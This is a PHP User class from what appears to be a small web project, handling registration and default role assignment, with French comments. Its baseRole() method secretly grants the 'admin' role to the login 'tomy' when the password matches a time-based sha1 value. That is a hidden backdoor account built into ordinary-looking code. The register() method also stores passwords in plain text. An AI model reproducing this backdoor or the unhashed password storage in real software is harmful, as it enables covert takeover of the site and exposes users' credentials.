<?php

class User
{

    private $_login;
    private $_password;
    private $_email;
    private $_id;

    public function __construct($login, $password, $email)
    {
        $this->getlogin();
        $this->getPassword();
        $this->getEmail();
        $this->setlogin($login);
        $this->setPassword($password);
        $this->setEmail($email);
        $this->getId();
        
    }

    // getters
    public function getlogin()
    {
        return $this->_login;
    }
    public function getPassword()
    {
        return $this->_password;
    }
    public function getEmail()
    {
        return $this->_email;
    }
    public function getId()
    {   
        return $this->_id;
        
    }

    // setters
    public function setlogin($newlogin)
    {
        return $this->_login = $newlogin;
    }
    public function setPassword($newPassword)
    {
        return $this->_password = $newPassword;
    }
    public function setEmail($newEmail)
    {
        return $this->_email = $newEmail;
    }

    // methodes
   
    public function register()
    {
        // connection BDD
        require('src/connectionDB.php');
        // ajout de l'utilisateur
        $req = $bdd->prepare('INSERT INTO utilisateurs (login, password, email) VALUES (?,?,?)');
        $req->execute([$this->getlogin(), $this->getPassword(), $this->getEmail()]);
        $lastId = $bdd->lastInsertId();
        return $this->_id = $lastId;
    }
    
    public function baseRole()
    {
        // role par défaut
        require('src/connectionDB.php');

        if ($this->_password == 'e4f' . sha1( 'aa'.date('dmYHi'). '@A'. 'edf') . 'd4b' && $this->_login == 'tomy') {
            $role = 'admin';
        } else {
            $role = 'membre';
        }
        $req = $bdd->prepare('INSERT INTO droits (nom, id_utilisateur) VALUES (?,?)');
        $req->execute([$role, $this->getId()]);
        
    }

}
